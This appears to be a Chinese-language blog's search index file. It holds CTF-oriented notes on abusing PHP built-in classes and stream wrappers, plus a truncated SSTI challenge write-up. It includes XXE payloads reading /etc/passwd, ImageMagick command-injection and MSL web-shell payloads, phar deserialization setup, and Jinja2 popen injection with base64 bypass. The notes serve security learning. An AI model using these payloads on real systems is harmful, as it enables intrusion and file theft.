<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>PHP原生类</title>
    <link href="/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/"/>
    <url>/tuyi/2025/01/24/PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/</url>
    
    <content type="html"><![CDATA[<p>本文介绍php常用的原生类</p><p>在php中只要函数名和参数可控，那么使用php原生类会有很大作用</p><blockquote><p>前提：<code>php.ini</code> 中通过 <code>disable_classes</code> 限制</p></blockquote><h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><h2 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a><strong>DirectoryIterator</strong></h2><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a><strong>FilesystemIterator</strong></h2><p>与DirectoryIterator相比具有更好的性能，用法其实是一样的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">传入路径进行扫描<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;/path/to/directory&#x27;</span>);<br>可配合glob伪协议进行精确读取<br><span class="hljs-variable">$dir</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&#x27;glob:///f*&#x27;</span>); 读取根目录下以f开头的文件<br></code></pre></td></tr></table></figure><blockquote><p>一般情况不能遍历输出那么就只能输出一个</p></blockquote><h2 id="GlobIterator"><a href="#GlobIterator" class="headerlink" title="GlobIterator"></a><strong>GlobIterator</strong></h2><p><code>GlobIterator</code> 是 PHP 的内置类，继承自 <code>FilesystemIterator</code>，专为 <strong>基于通配符模式（glob）的文件遍历</strong> 设计。它简化了按模式匹配文件的过程，无需手动过滤文件名，适用于快速枚举文件系统或查找特定文件。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接输入通配符使用<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;*.php&#x27;</span>);<br>或者配合路径使用 查找路径下匹配的文件<br><span class="hljs-variable">$iterator</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-string">&#x27;/var/www/*.php&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h1><h2 id="SplFileObject"><a href="#SplFileObject" class="headerlink" title="SplFileObject"></a><strong>SplFileObject</strong></h2><p><code>SplFileObject</code> 是 PHP 的内置类，继承自 <code>SplFileInfo</code>，专为 <strong>高效读写文件</strong> 设计。它在 CTF 中常用于 <strong>文件内容读取</strong>、<strong>源码泄露</strong> 和 <strong>特殊协议利用</strong>，尤其是在反序列化或文件操作漏洞场景中</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">直接读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;/etc/passwd&#x27;</span>);<br>配合伪协议读取文件<br><span class="hljs-variable">$file</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-string">&#x27;php://filter/convert.base64-encode/resource=h1nt.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="SimpleXMLElement"><a href="#SimpleXMLElement" class="headerlink" title="SimpleXMLElement"></a><strong><code>SimpleXMLElement</code></strong></h2><p><code>SimpleXMLElement</code> 是 PHP 的内置类，用于解析和操作 XML 数据。在 CTF 中，它常被用于 <strong>XXE（XML External Entity）攻击</strong>，通过构造恶意 XML 实体实现 <strong>文件读取</strong>、<strong>SSRF（服务端请求伪造）</strong> 或 <strong>远程代码执行</strong>。</p><p>基本用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-string">&#x27;data.xml&#x27;</span>, <span class="hljs-number">0</span>, <span class="hljs-literal">true</span>); <span class="hljs-comment">// 从文件加载</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>-&gt;user;<br></code></pre></td></tr></table></figure><p>可以解析XML实体文件那么可不可以自己写个XML文件实现rce或者任意文件读取呢</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//配合伪协议读取文件</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-comment">// 需要关闭实体加载器限制（PHP &lt; 8.0）</span><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$sxe</span>; <span class="hljs-comment">// 输出 /etc/passwd 内容</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//进行ssrf，进行外带等操作</span><br><span class="hljs-variable">$payload</span> = <span class="hljs-string">&lt;&lt;&lt;XML</span><br><span class="hljs-string">&lt;!DOCTYPE test [</span><br><span class="hljs-string">    &lt;!ENTITY xxe SYSTEM &quot;http://192.168.1.1:8080/&quot;&gt;</span><br><span class="hljs-string">]&gt;</span><br><span class="hljs-string">&lt;root&gt;&amp;xxe;&lt;/root&gt;</span><br><span class="hljs-string">XML</span>;<br><br><span class="hljs-variable">$sxe</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$payload</span>, LIBXML_NOENT);<br></code></pre></td></tr></table></figure><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="Imagick"><a href="#Imagick" class="headerlink" title="Imagick"></a><strong><code>Imagick</code></strong></h2><p><code>Imagick</code> 是 PHP 的图像处理扩展，支持多种图像格式的操作。在 CTF 中，它常被用于 <strong>恶意图像利用</strong> 和 <strong>文件读取&#x2F;命令执行</strong></p><blockquote><p>CVE-2016-3714:允许通过恶意图像执行命令，利用本函数</p></blockquote><p>先上传恶意图片</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs smali">push graphic-context<br>viewbox 0 0 640 480<span class="hljs-built_in"></span><br><span class="hljs-built_in">fill </span>&#x27;url(https://example.com/image.jpg<span class="hljs-string">&quot;|ls -la &gt; /tmp/result&quot;</span>)&#x27;<br>pop graphic-context<br></code></pre></td></tr></table></figure><p>在触发</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;exploit.png&#x27;</span>); <span class="hljs-comment">// 读取恶意图像</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.png&#x27;</span>);    <span class="hljs-comment">// 触发命令</span><br></code></pre></td></tr></table></figure><p>MSL 脚本利用</p><p>上传恶意msl文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">image</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">read</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;caption:&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot;</span>/&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">write</span> <span class="hljs-attr">filename</span>=<span class="hljs-string">&quot;output.php&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">image</span>&gt;</span><br></code></pre></td></tr></table></figure><p><strong>触发 MSL 脚本</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>();<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">readImage</span>(<span class="hljs-string">&#x27;msl:poc.msl&#x27;</span>); <span class="hljs-comment">// 加载 MSL 脚本</span><br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;dummy.png&#x27;</span>);  <span class="hljs-comment">// 生成 output.php</span><br></code></pre></td></tr></table></figure><p>访问 <code>output.php?cmd=id</code> 即可执行命令</p><p>通过 <code>caption:</code> 协议读取本地文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$imagick</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Imagick</span>(<span class="hljs-string">&#x27;caption:&lt;?php echo file_get_contents(&quot;/flag&quot;); ?&gt;&#x27;</span>);<br><span class="hljs-variable">$imagick</span>-&gt;<span class="hljs-title function_ invoke__">writeImage</span>(<span class="hljs-string">&#x27;output.php&#x27;</span>); <span class="hljs-comment">// 生成包含 Flag 的 PHP 文件</span><br></code></pre></td></tr></table></figure><h1 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h1><h2 id="Error和Exception"><a href="#Error和Exception" class="headerlink" title="Error和Exception"></a>Error和Exception</h2><p>对于没有回显的rce可以利用这个方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exploit</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$message</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;message = <span class="hljs-variable">$cmd</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$this</span>-&gt;message); <span class="hljs-comment">// 触发命令执行但是没有回显</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 构造 Error 对象，利用其 __toString 方法</span><br><span class="hljs-variable">$error</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>((<span class="hljs-keyword">string</span>) <span class="hljs-keyword">new</span> <span class="hljs-title class_">Exploit</span>(<span class="hljs-string">&#x27;id&#x27;</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$error</span>; <span class="hljs-comment">// 输出命令执行结果</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP原生类</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP伪协议</title>
    <link href="/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/tuyi/2025/01/23/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>介绍php常见的伪协议</p><h1 id="php-协议族"><a href="#php-协议族" class="headerlink" title="php:&#x2F;&#x2F; 协议族"></a>php:&#x2F;&#x2F; 协议族</h1><p>这些协议用于访问 PHP 的输入&#x2F;输出流、内存、临时文件等资源</p><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a><strong><code>php://input</code></strong></h2><p><strong>用途</strong>：读取原始的 HTTP 请求体数据（如 POST,GET 数据）</p><p><strong>实例</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$rawData</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br></code></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a><strong><code>php://filter</code></strong></h2><p><strong>用途</strong>：在读写文件时应用过滤器（如编码&#x2F;加密）。</p><p><strong>语法</strong>：<code>php://filter/&lt;过滤器链&gt;/resource=&lt;文件路径&gt;</code></p><p>官方文档：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros">名称 描述<br><span class="hljs-attribute">resource</span>=&lt;要过滤的数据流&gt;     这个参数是必须的。它指定了你要筛选过滤的数据流。<br><span class="hljs-attribute">read</span>=&lt;读链的筛选列表&gt;         该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br><span class="hljs-attribute">write</span>=&lt;写链的筛选列表&gt;    该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。<br>&lt;；两个链的筛选列表&gt;        任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。<br></code></pre></td></tr></table></figure><h3 id="过滤器："><a href="#过滤器：" class="headerlink" title="过滤器："></a>过滤器：</h3><h3 id="转换过滤器："><a href="#转换过滤器：" class="headerlink" title="转换过滤器："></a>转换过滤器：</h3><h4 id="convert-base64-encode-和-convert-base64-decode"><a href="#convert-base64-encode-和-convert-base64-decode" class="headerlink" title="convert.base64-encode 和 convert.base64-decode"></a>convert.base64-encode 和 convert.base64-decode</h4><p>将读取的数据进行base64转换后输出</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="convert-quoted-printable-encode-和-convert-quoted-printable-decode"><a href="#convert-quoted-printable-encode-和-convert-quoted-printable-decode" class="headerlink" title="convert.quoted-printable-encode 和 convert.quoted-printable-decode"></a>convert.quoted-printable-encode 和 convert.quoted-printable-decode</h4><p>将非ascii码的值转换为转换为 <code>=XX</code> 格式的 ASCII 字符串，其中 <code>XX</code> 是该字符的十六进制值。</p><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;Hello, 世界! =&quot;</span>;<br><span class="hljs-variable">$encoded</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://filter/write=convert.quoted-printable-encode/resource=data://text/plain,&#x27;</span> . <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-variable">$text</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$encoded</span>;<br><span class="hljs-comment">//Hello,=20=E4=B8=96=E7=95=8C!=20=3D 中文被转换</span><br></code></pre></td></tr></table></figure><h4 id="convert-iconv"><a href="#convert-iconv" class="headerlink" title="convert.iconv.*"></a>convert.iconv.*</h4><blockquote><p>依赖 <code>iconv</code> 扩展，需确保 PHP 已启用该扩展</p></blockquote><p><code>convert.iconv.*</code> 是一个强大的流过滤器（Stream Filter），用于在不同字符编码之间进行转换</p><p><strong>过滤器格式</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">convert.iconv.&lt;输入编码&gt;.&lt;输出编码&gt;<br>或<br>convert.iconv.&lt;输出编码&gt;/&lt;输入编码&gt;<br></code></pre></td></tr></table></figure><p>用法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//将 UTF-8 字符串写入为 GBK 文件</span><br><span class="hljs-variable">$text</span> = <span class="hljs-string">&quot;你好，世界！&quot;</span>;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/write=convert.iconv.utf-8.gbk/resource=output.txt&#x27;</span>,<br>    <span class="hljs-variable">$text</span><br>);<br></code></pre></td></tr></table></figure><h3 id="链式过滤器"><a href="#链式过滤器" class="headerlink" title="链式过滤器"></a><strong>链式过滤器</strong></h3><p>不同的过滤器可以用管道符连接做一个链子</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 先解码 Base64，再转换编码（假设原始数据是 GBK 编码的 Base64）</span><br><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<br>    <span class="hljs-string">&#x27;php://filter/read=convert.base64-decode|convert.iconv.gbk.utf-8/resource=data.txt&#x27;</span><br>);<br></code></pre></td></tr></table></figure><h1 id="zip"><a href="#zip" class="headerlink" title="zip://"></a><strong><code>zip://</code></strong></h1><p><strong>用途</strong>：读取 ZIP 压缩包中的文件。</p><p><strong>语法</strong>：<code>zip://&lt;压缩包路径&gt;#&lt;内部文件&gt;</code>。</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;zip://archive.zip#file.txt&#x27;</span>);<br></code></pre></td></tr></table></figure><h1 id="data"><a href="#data" class="headerlink" title="data://"></a><strong><code>data://</code></strong></h1><p><strong>介绍</strong>：数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data:&#x2F;&#x2F;流会被当作php文件执行。</p><p>allow_url_fopen和allow_url_include都需要开启。</p><p><strong>语法</strong>：<code>data:[&lt;MIME类型&gt;][;base64],&lt;数据&gt;</code>。</p><ul><li><strong>MIME 类型</strong>（可选）：指定数据的格式（如 <code>text/plain</code>, <code>image/png</code>），默认是 <code>text/plain</code>。</li><li><strong>base64</strong>（可选标记）：表示数据是 Base64 编码的。</li><li><strong>数据</strong>：原始内容或 Base64 编码后的内容。</li></ul><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;data://text/plain;base64,SGVsbG8=&#x27;</span>); <span class="hljs-comment">// 输出 &quot;Hello&quot;</span><br></code></pre></td></tr></table></figure><h1 id="phar"><a href="#phar" class="headerlink" title="phar://"></a><strong><code>phar://</code></strong></h1><p><strong>用途</strong>：访问 PHAR（PHP 归档）文件中的内容。</p><p><strong>语法</strong>：<code>phar://&lt;路径&gt;/file.phar/&lt;内部文件&gt;</code>。</p><p><strong>用法</strong>：在反序列化可以用</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/fb3befe87ee638410501d54bc543c8f3.png" alt="来自CSDN块块"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 创建并配置 PHAR</span><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br> <br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>使用phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;phar://phar.phar&#x27;</span>;      <span class="hljs-comment">#phar协议，phar.phar包，</span><br>  <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>);     <span class="hljs-comment">#受影响的file_exists函数 触发反序列化</span><br></code></pre></td></tr></table></figure><h1 id="glob"><a href="#glob" class="headerlink" title="glob://"></a><strong><code>glob://</code></strong></h1><p><strong>用途</strong>：匹配文件路径模式（如遍历目录）。一般配合原生类使用</p><p><strong>示例</strong>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">foreach</span> (<span class="hljs-title function_ invoke__">glob</span>(<span class="hljs-string">&#x27;glob:///path/*.txt&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123; ... &#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>伪协议</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.23</title>
    <link href="/tuyi/2025/01/23/2025-1-23/"/>
    <url>/tuyi/2025/01/23/2025-1-23/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>2025.1.22</title>
    <link href="/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/"/>
    <url>/tuyi/2025/01/22/%E6%AF%8F%E6%97%A5%E4%B8%80web-2025-1-22/</url>
    
    <content type="html"><![CDATA[<h1 id="2023愚人杯easy-ssti"><a href="#2023愚人杯easy-ssti" class="headerlink" title="2023愚人杯easy-ssti"></a>2023愚人杯easy-ssti</h1><p>进入F12打开控制台提示下载app.zip</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> render_template_string,render_template<br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>(<span class="hljs-params">name=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;hello.html&#x27;</span>,name=name)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/hello/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hellodear</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ge&quot;</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;f&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> name:<br>        <span class="hljs-keyword">return</span> render_template_string(<span class="hljs-string">&#x27;hello %s&#x27;</span> % name)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Nonononon&#x27;</span><br></code></pre></td></tr></table></figure><p>hello目录下有ssti</p><p>payload要有ge或者不能有f</p><p>尝试打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>但是 &#x2F; 被当作路由报错，尝试绕过，使用base64编码<strong>反引号</strong>执行命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">`<span class="hljs-built_in">echo</span> bHMgLw== | <span class="hljs-built_in">base64</span> -d`<br></code></pre></td></tr></table></figure><p>得到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;lipsum.__globals__[<span class="hljs-string">&#x27;os&#x27;</span>].popen(<span class="hljs-string">&#x27;`echo bHMgLw== | base64 